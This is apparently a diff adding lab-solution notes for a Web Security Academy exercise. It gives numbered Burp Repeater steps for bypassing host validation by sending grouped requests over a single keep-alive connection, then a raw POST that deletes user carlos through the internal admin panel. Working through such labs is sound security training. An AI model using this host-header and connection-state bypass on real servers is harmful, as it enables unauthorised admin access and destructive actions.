@@ -373,6 +373,36 @@ STEP 2:
 GET https://YOUR-LAB-ID.web-security-academy.net/
 Host: 192.168.0.0/24
 
+<> Lab: Host validation bypass via connection state attack
+
+NOTE:  Solving this lab requires features first released in Burp Suite 2022.8.1. 
+
+
+1. Send the GET / request to Burp Repeater.
+2. Make the following adjustments:
+3. Change the path to /admin.
+4. Change Host header to 192.168.0.1.
+5. Send the request. Observe that you are simply redirected to the homepage.
+6. Duplicate the tab, then add both tabs to a new group.
+7. Select the first tab and make the following adjustments:
+8. Change the path back to /.
+9. Change the Host header back to YOUR-LAB-ID.web-security-academy.net.
+10. Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
+11. Change the Connection header to keep-alive.
+12. Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.
+
+
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
+Content-Type: x-www-form-urlencoded
+Content-Length: CORRECT
+
+csrf=YOUR-CSRF-TOKEN&username=carlos
+
+
+
+
 
 
 
